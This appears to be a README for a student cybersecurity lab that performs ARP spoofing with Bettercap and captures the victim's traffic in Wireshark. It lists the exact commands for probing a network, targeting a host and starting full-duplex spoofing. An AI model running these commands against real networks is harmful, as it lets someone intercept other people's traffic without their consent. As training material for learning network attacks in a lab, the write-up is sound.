# Bettercap ARP Spoofing Lab

## Objective
Performed ARP spoofing and packet analysis using Bettercap and Wireshark in a controlled lab environment.

---

## Tools Used
- Kali Linux
- Bettercap
- Wireshark
- VirtualBox

---

## Installation

```bash
sudo apt-get install bettercap
```

---

## Commands Used

### To know all interfaces
```bash
ip a
```

### To select interface
```bash
bettercap -iface eth0
```

### To check all active modules
```bash
help
```

### To check connected network
```bash
net.probe on
```

### To check ARP spoof help
```bash
help arp.spoof
```

### To attack router
```bash
set arp.spoof.fullduplex true
```

### To choose target machine
```bash
set arp.spoof.targets <ip>
```

### To start ARP spoofing
```bash
arp.spoof on
```

### To verify spoofed MAC in Windows
```bash
arp -a
```

---

## Practical Steps

1. Checked network interfaces and routing configuration.
2. Started Bettercap using the eth0 interface.
3. Enabled network probing to detect connected devices.
4. Viewed ARP spoof module options and configurations.
5. Enabled full duplex ARP spoofing.
6. Selected the target IP address.
7. Started ARP spoofing.
8. Captured and analyzed packets using Wireshark.
9. Verified SMB, NetBIOS, mDNS, and broadcast traffic.

---

## Screenshots

### Interface Configuration
![Interface](screenshots/interface.png)

### Bettercap Running
![Bettercap](screenshots/bettercap.png)

### ARP Spoofing
![ARP Spoof](screenshots/arp-spoof.png)

### Wireshark Capture
![Wireshark](screenshots/wireshark.png)

---

## Packet Analysis

Traffic from the target machine was analyzed using Wireshark. Protocols such as SMB, NetBIOS, IGMPv3, mDNS, and broadcast traffic were observed during the practical session.

---

## Report

Detailed documentation is available in the `report` folder.

---

## Disclaimer

This project was performed in a controlled lab environment for educational and ethical cybersecurity learning purposes only.
